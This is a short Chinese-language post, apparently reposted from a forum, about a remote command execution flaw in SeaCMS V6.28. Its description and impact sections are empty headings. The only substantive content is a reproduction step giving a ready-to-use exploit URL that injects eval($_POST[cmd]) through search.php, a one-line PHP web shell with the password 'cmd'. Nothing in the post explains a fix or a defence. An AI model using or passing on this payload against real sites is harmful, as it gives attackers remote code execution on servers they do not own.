# Seacms V6.28

> 原文：[https://www.zhihuifly.com/t/topic/3113](https://www.zhihuifly.com/t/topic/3113)

# Seacms V6.28 远程命令执行漏洞

## 一、漏洞简介

## 二、漏洞影响

## 三、复现过程

```
一句话payload，密码cmd: `[http://0-sec.org/search.php?searchtype=5&tid=&area=eval($_POST[cmd])](http://0-sec.org/search.php?searchtype=5&tid=&area=eval(%24_POST%5Bcmd%5D))` 
```